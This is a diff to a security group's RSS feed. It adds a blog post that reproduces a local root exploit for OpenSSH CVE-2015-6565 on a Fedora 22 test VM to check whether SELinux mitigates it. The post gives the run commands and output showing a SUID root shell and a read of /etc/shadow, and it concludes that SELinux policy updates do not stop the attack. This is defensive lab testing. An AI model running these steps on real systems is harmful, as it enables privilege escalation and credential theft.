@@ -7,8 +7,263 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>ja-JP</language>
     <copyright>SOSS SIG all rights reserved. 2016</copyright>
-    <lastBuildDate>Mon, 23 Jan 2017 13:07:34 +0900</lastBuildDate>
+    <lastBuildDate>Thu, 02 Feb 2017 09:46:27 +0900</lastBuildDate>
     <atom:link href="https://jsoss-sig.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>OpenSSH vulnerability (CVE-2015-6565) PoC with SELinux</title>
+      <link>https://jsoss-sig.github.io/post/omok-selinux-openssh-20170201/</link>
+      <pubDate>Thu, 02 Feb 2017 09:46:27 +0900</pubDate>
+      
+      <guid>https://jsoss-sig.github.io/post/omok-selinux-openssh-20170201/</guid>
+      <description>
+
+&lt;p&gt;We found there was information about PoC to get local priveledge with
+CVE-2015-6565(vulnerability for OpenSSH), then we want to make sure can we
+protect it by using SELinux or not.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;reference&#34;&gt;Reference&lt;/h2&gt;
+
+&lt;h4 id=&#34;http-www-openwall-com-lists-oss-security-2017-01-26-2&#34;&gt;&lt;a href=&#34;http://www.openwall.com/lists/oss-security/2017/01/26/2&#34;&gt;http://www.openwall.com/lists/oss-security/2017/01/26/2&lt;/a&gt;&lt;/h4&gt;
+
+&lt;h2 id=&#34;prepare-for-poc&#34;&gt;Prepare for PoC&lt;/h2&gt;
+
+&lt;p&gt;Here is a description how to reproduce it. &lt;strong&gt;I used Fedora22-VMWare Guest
+because this vulnerability is for OpenSSH 6.8-6.9. Also I assigned only 1 CPU
+to that guest.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Install Fedora22 with OpenSSH-enabled / enabled gcc and those dev tool. Because this is for PoC I didn&amp;rsquo;t update Fedora22(everything package versions are same as DVD).&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The openssh version is 6.8p1-5 ;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;    [root@localhost ~]# rpm -qa|grep -i openssh
+openssh-6.8p1-5.fc22.x86_64
+openssh-server-6.8p1-5.fc22.x86_64
+openssh-clients-6.8p1-5.fc22.x86_64
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Put PoC code which you can see on &lt;a href=&#34;http://www.openwall.com/lists/oss-security/2017/01/26/2&#34;&gt;the referenced page.&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Compile that code on PoC Fedora22;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[sios@localhost ~]$  gcc not_an_sshnuke.c -o not_an_sshnuke
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;poc&#34;&gt;PoC&lt;/h2&gt;
+
+&lt;p&gt;Now it&amp;rsquo;s ready for PoC.&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Run the code with normal user account;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[sios@localhost ~]$ ./not_an_sshnuke /dev/pts/3
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Run the code with normal user account;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[sios@localhost ~]$ ./not_an_sshnuke /dev/pts/3
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;[*] Waiting for slave device /dev/pts/3&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Open 2 terminals and ssh to the PoC machine in each terminal with normal user account;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[omok@extest ~]$ ssh -l omok 172.16.148.139
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;omok@172.16.148.139&amp;rsquo;s password:
+Last login: Sun Jan 29 14:06:21 2017 from 172.16.148.1
+[omok@localhost ~]$&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[omok@extest ~]$ ssh -l omok 172.16.148.139
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;omok@172.16.148.139&amp;rsquo;s password:
+Last login: Sun Jan 29 14:06:21 2017 from 172.16.148.1
+[omok@localhost ~]$&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Open another terminal and ssh to the PoC machine with &lt;strong&gt;root&lt;/strong&gt; account. If ;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[omok@extest ~]$ ssh -l root 172.16.148.139
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;root@172.16.148.139&amp;rsquo;s password:
+Last login: Sun Jan 29 14:06:37 2017 from 172.16.148.1
+[root@localhost ~]#&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;On the first terminal, you can see following results;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[omok@localhost src]$ ./not_an_sshnuke /dev/pts/3
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;[*] Waiting for slave device /dev/pts/3
+[+] Got PTY slave /dev/pts/3
+[+] Making PTY slave the controlling terminal
+[+] SUID shell at /tmp/sh&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Just want to make sure /tmp/sh attribute;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[root@localhost ~]# ls -lZ /tmp/sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;-rwsr-xr-x. 1 root root unconfined_u:object_r:user_tmp_t:s0 1084536 Feb  2 01:31 /tmp/sh&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Then run /tmp/sh on first terminal with following option;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[omok@localhost src]$ /tmp/sh --norc --noprofile -p
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Now we got &amp;ldquo;euid=0&amp;rdquo;;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;sh-4.3# id
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;uid=1000(omok) gid=1000(omok) euid=0(root) groups=1000(omok),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+sh-4.3# cat /etc/shadow
+bin:&lt;em&gt;:16489:0:99999:7:::
+daemon:&lt;/em&gt;:16489:0:99999:7:::
+adm:&lt;em&gt;:16489:0:99999:7:::
+lp:&lt;/em&gt;:16489:0:99999:7:::&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;SELinux is &amp;ldquo;Enabled&amp;rdquo;;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;sh-4.3# getenforce
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Enforcing&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;poc-with-updated-selinux&#34;&gt;PoC with &amp;ldquo;updated SELinux&amp;rdquo;&lt;/h2&gt;
+
+&lt;p&gt;So, we found normal(non-upgraded) SELinux Policy on Fedora22 can&amp;rsquo;t protect
+tihs vulnerability.&lt;/p&gt;
+
+&lt;p&gt;Then now we wonder how about &amp;ldquo;updated SELinux Policy&amp;rdquo;.&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Update SELinux Policy;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[root@localhost ~]# dnf -y update selinux-policy-targeted
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Fedora 22 - x86_64 - Updates                    2.2 MB/s |  23 MB     00:10&lt;br /&gt;
+Last metadata expiration check performed 0:00:13 ago on Wed Feb  1 04:46:43 2017.&lt;/p&gt;
+
+&lt;h1 id=&#34;dependencies-resolved&#34;&gt;Dependencies resolved.&lt;/h1&gt;
+
+&lt;h1 id=&#34;package-arch-version-repository-size&#34;&gt;Package                    Arch      Version                  Repository  Size&lt;/h1&gt;
+
+&lt;p&gt;Upgrading:
+ selinux-policy             noarch    3.13.1-128.28.fc22       updates    428 k
+ selinux-policy-targeted    noarch    3.13.1-128.28.fc22       updates    4.1 M&lt;/p&gt;
+
+&lt;h1 id=&#34;transaction-summary&#34;&gt;Transaction Summary&lt;/h1&gt;
+
+&lt;p&gt;Upgrade  2 Packages&lt;/p&gt;
+
+&lt;p&gt;Total download size: 4.5 M
+Downloading Packages:
+(&lt;sup&gt;1&lt;/sup&gt;&amp;frasl;&lt;sub&gt;2&lt;/sub&gt;): selinux-policy-3.13.1-128.28.fc22.noarch 1.6 MB/s | 428 kB     00:00&lt;/p&gt;
+
+&lt;h2 id=&#34;2-2-selinux-policy-targeted-3-13-1-128-28-fc-998-kb-s-4-1-mb-00-04&#34;&gt;(&lt;sup&gt;2&lt;/sup&gt;&amp;frasl;&lt;sub&gt;2&lt;/sub&gt;): selinux-policy-targeted-3.13.1-128.28.fc 998 kB/s | 4.1 MB     00:04&lt;/h2&gt;
+
+&lt;p&gt;Total                                           825 kB/s | 4.5 MB     00:05&lt;br /&gt;
+Running transaction check
+Transaction check succeeded.
+Running transaction test
+Transaction test succeeded.
+Running transaction
+  Upgrading   : selinux-policy-3.13.1-128.28.fc22.noarch                    &lt;sup&gt;1&lt;/sup&gt;&amp;frasl;&lt;sub&gt;4&lt;/sub&gt;
+  Upgrading   : selinux-policy-targeted-3.13.1-128.28.fc22.noarch           &lt;sup&gt;2&lt;/sup&gt;&amp;frasl;&lt;sub&gt;4&lt;/sub&gt;
+  Cleanup     : selinux-policy-targeted-3.13.1-122.fc22.noarch              &lt;sup&gt;3&lt;/sup&gt;&amp;frasl;&lt;sub&gt;4&lt;/sub&gt;
+  Cleanup     : selinux-policy-3.13.1-122.fc22.noarch                       &lt;sup&gt;4&lt;/sup&gt;&amp;frasl;&lt;sub&gt;4&lt;/sub&gt;
+  Verifying   : selinux-policy-targeted-3.13.1-128.28.fc22.noarch           &lt;sup&gt;1&lt;/sup&gt;&amp;frasl;&lt;sub&gt;4&lt;/sub&gt;
+  Verifying   : selinux-policy-3.13.1-128.28.fc22.noarch                    &lt;sup&gt;2&lt;/sup&gt;&amp;frasl;&lt;sub&gt;4&lt;/sub&gt;
+  Verifying   : selinux-policy-3.13.1-122.fc22.noarch                       &lt;sup&gt;3&lt;/sup&gt;&amp;frasl;&lt;sub&gt;4&lt;/sub&gt;
+  Verifying   : selinux-policy-targeted-3.13.1-122.fc22.noarch              &lt;sup&gt;4&lt;/sup&gt;&amp;frasl;&lt;sub&gt;4&lt;/sub&gt;&lt;/p&gt;
+
+&lt;p&gt;Upgraded:
+  selinux-policy.noarch 3.13.1-128.28.fc22&lt;br /&gt;
+  selinux-policy-targeted.noarch 3.13.1-128.28.fc22&lt;/p&gt;
+
+&lt;p&gt;Complete!
+[root@localhost ~]# getenforce
+Enforcing&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;We continue to that PoC with updated SELinux Policy again;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[omok@localhost src]$ ./not_an_sshnuke /dev/pts/3
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;[*] Waiting for slave device /dev/pts/3
+[+] Got PTY slave /dev/pts/3
+[+] Making PTY slave the controlling terminal
+[+] SUID shell at /tmp/sh&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Just want to make sure /tmp/sh attribute;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[root@localhost ~]# ls -lZ /tmp/sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;-rwsr-xr-x. 1 root root unconfined_u:object_r:user_tmp_t:s0 1084536 Feb  2 01:47 /tmp/sh&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Run /tmp/sh with updated SELinux Policy;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[omok@localhost src]$ /tmp/sh --norc --noprofile -p
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;sh-4.3# id
+uid=1000(omok) gid=1000(omok) euid=0(root) groups=1000(omok),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+sh-4.3# cat /etc/shadow
+bin:&lt;em&gt;:16489:0:99999:7:::
+daemon:&lt;/em&gt;:16489:0:99999:7:::
+adm:&lt;em&gt;:16489:0:99999:7:::
+lp:&lt;/em&gt;:16489:0:99999:7:::
+sh-4.3# exit
+exit
+[omok@localhost src]$ getenforce
+Enforcing&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Just we want to make sure SELinux Policy is updated;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[omok@localhost src]$ rpm -qa|grep -i selinux-policy
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;selinux-policy-3.13.1-128.28.fc22.noarch
+selinux-policy-targeted-3.13.1-128.28.fc22.noarch&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;It seems that even if we update SELinux Policy, we can&amp;rsquo;t mitigate this
+vulnerability(CVE-2015-6565).&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;Now we could see that CVE-2015-6565 PoC is successfull even if SELinux is
+enforcing. The main reason is because that vulnerability is using TIOCSTI +
+ioctl.&lt;/p&gt;
+
+&lt;p&gt;This seems to be close to &lt;a href=&#34;https://www.spinics.net/lists/selinux/msg20112.html&#34;&gt;CVE-2016-7545(can escape SELinux sandboxing). In
+that vulnerability, we could fix it by updating
+policycoreutils.&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Probably we can modify SELinux policy and could be mitigate this
+vulnerability. We will continue to check it.&lt;/p&gt;
+
+&lt;p&gt;Also we couldn&amp;rsquo;t reproduce it on Fedora25+openssh6.8p1.&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>Docker vulnerability (CVE-2016-9962) PoC with SELinux (Again)</title>
